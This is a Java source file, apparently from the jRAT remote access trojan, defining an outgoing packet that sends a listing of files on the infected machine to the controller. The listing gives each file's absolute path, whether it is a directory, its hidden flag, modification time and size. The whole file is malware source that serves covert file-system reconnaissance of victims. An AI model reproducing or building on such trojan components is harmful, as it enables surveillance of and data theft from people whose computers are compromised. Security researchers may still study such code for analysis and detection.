package jrat.client.packets.outgoing;

import io.jrat.common.io.StringWriter;
import java.io.DataOutputStream;
import java.io.File;
import java.util.Calendar;
import java.util.Date;


public class Packet22ListFiles extends AbstractOutgoingPacket {

	private File[] files;

	public Packet22ListFiles(File[] files) {
		this.files = files;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		dos.writeInt(files == null ? 0 : files.length);

		for (int i = 0; i < (files == null ? 0 : files.length); i++) {
			File file = files[i];
			
			sw.writeLine(file.getAbsolutePath());

			if (file.isDirectory()) {
				dos.writeBoolean(true);
				dos.writeBoolean(file.isHidden());
			} else {
				dos.writeBoolean(false);
				dos.writeBoolean(file.isHidden());
				dos.writeLong(file.lastModified());
				dos.writeLong(file.length());
			}
		}

	}

	@Override
	public short getPacketId() {
		return 22;
	}

	public static String getDate(long date) {
		Calendar cal = Calendar.getInstance();
		cal.setTime(new Date(date));
		return (cal.get(Calendar.MONTH) + 1) + "/" + cal.get(Calendar.DAY_OF_MONTH) + "/" + cal.get(Calendar.YEAR) + " " + (00 + cal.get(Calendar.HOUR_OF_DAY)) + ":" + cal.get(Calendar.MINUTE);
	}

}
